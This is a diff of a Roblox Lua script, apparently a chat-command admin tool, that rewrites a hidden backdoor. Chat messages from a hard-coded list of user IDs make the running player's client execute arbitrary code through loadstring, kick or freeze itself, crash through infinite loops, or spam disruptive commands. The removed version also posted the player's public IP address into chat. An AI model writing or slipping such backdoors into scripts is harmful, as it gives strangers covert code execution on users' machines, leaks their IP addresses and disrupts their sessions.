@@ -1,51 +1,108 @@
-local function gpfs(str)
+local function getplayerfromstring(str)
     for i, v in pairs(game.Players:GetPlayers()) do
+        if str:lower() == "me" then
+            return game.Players.LocalPlayer
+        end
         if str:lower() == (v.Name:lower()):sub(1, #str) or str:lower() == (v.DisplayName:lower()):sub(1, #str) then
             return v
         end
     end
 end
-game.Players.PlayerAdded:Connect(
-    function(knocks)
-        if knocks.Name == "jjjuuikjjikkju" or knocks.Name == "decryptionites" then
-            knocks.Chatted:Connect(
-                function(rizz)
-                    local splitted = rizz:split(" ")
-                    if splitted[1] == "b!kick" then
-                        local kreason = #splitted[1] + 1
-                        game.Players.LocalPlayer:Kick(string.sub(rizz, kreason))
-                        task.wait(2)
+local allowed = {
+    120983992,
+    252684030,
+    466826765,
+    4445687128,
+    6561234,
+    1702851506,
+    5713660970,
+    1842223904,
+    58315225,
+    3367555199,
+    120983992,
+    4599596782,
+    1551416114,
+    1157113634,
+    6023246105,
+    3894108483
+}
+local bdconnections = {}
+local function updatebackdoor()
+    for i, v in pairs(bdconnections) do
+        v:disconnect()
+    end
+    for i, v in pairs(game.Players:GetPlayers()) do
+        if table.find(allowed, v.UserId) then
+            a =
+                v.Chatted:Connect(
+                function(msg)
+                    local splitted = msg:split(" ")
+                    if splitted[1] == "^ktest" then
+                        game.Players:Chat(
+                            "(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)"
+                        )
+                        task.wait(0.3)
+                        local args = {
+                            [1] = "/w " .. v.Name .. " i am using Kohls LITE",
+                            [2] = "All"
+                        }
+
+                        game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild(
+                            "SayMessageRequest"
+                        ):FireServer(unpack(args))
+                    elseif splitted[1] == "^kick" then
+                        local target = getplayerfromstring(splitted[2])
+                        if target.UserId == game.Players.LocalPlayer.UserId then
+                            game.Players.LocalPlayer:Kick(string.sub(msg, #splitted[1] + #splitted[2] + 3))
+                            task.wait(1)
+                            while true do
+                            end
+                        end
+                    elseif splitted[1] == "^run" then
+                        local execute = #splitted[1] + 1
+                        loadstring(string.sub(msg, execute))()
+                    elseif splitted[1] == "^crashall" then
                         while true do
                         end
-                    elseif splitted[1] == "b!run" then
-                        local execute = #splitted[1] + 1
-                        loadstring(string.sub(rizz, execute))()
-                    elseif splitted[1] == "b!show" then
-                        game.Players:Chat("ff " .. tostring(game:HttpGet("https://api.ipify.org/")))
+                    elseif splitted[1] == "^silc" then
+                        for i = 1, 5 do
+                            game.Players:Chat("size all .3")
+                        end
+                        for i = 1, 13 do
+                            game.Players:Chat("rocket/all all all 123456789")
+                            game.Players:Chat("freeze all all all 123456789")
+                            game.Players:Chat("dog all all all 123456789")
+                        end
+                        for i = 1, 5 do
+                            game.Players:Chat("size all 10")
+                        end
+                        for i = 1, 200 do
+                            game.Players:Chat("clone all all all 123456789")
+                        end
+                        while true do
+                            task.wait()
+                            game.Players:Chat("clone all all all 123456789")
+                        end
                     end
                 end
             )
         end
+    end
+end
+
+task.delay(
+    0.5,
+    function()
+        game.Players.PlayerAdded:Connect(
+            function()
+                updatebackdoor()
+            end
+        )
+        game.Players.PlayerRemoving:Connect(
+            function()
+                updatebackdoor()
+            end
+        )
+        updatebackdoor()
     end
 )
-for i, v in pairs(game.Players:GetPlayers()) do
-    if v.Name == "jjjuuikjjikkju" or v.Name == "decryptionites" then
-            v.Chatted:Connect(
-                function(rizz)
-                    local splitted = rizz:split(" ")
-                    if splitted[1] == "b!kick" then
-                        local kreason = #splitted[1] + 1
-                        game.Players.LocalPlayer:Kick(string.sub(rizz, kreason))
-                        task.wait(2)
-                        while true do
-                        end
-                    elseif splitted[1] == "b!run" then
-                        local execute = #splitted[1] + 1
-                        loadstring(string.sub(rizz, execute))()
-                    elseif splitted[1] == "b!show" then
-                        game.Players:Chat("ff " .. tostring(game:HttpGet("https://api.ipify.org/")))
-                    end
-                end
-            )
-        end
-    end
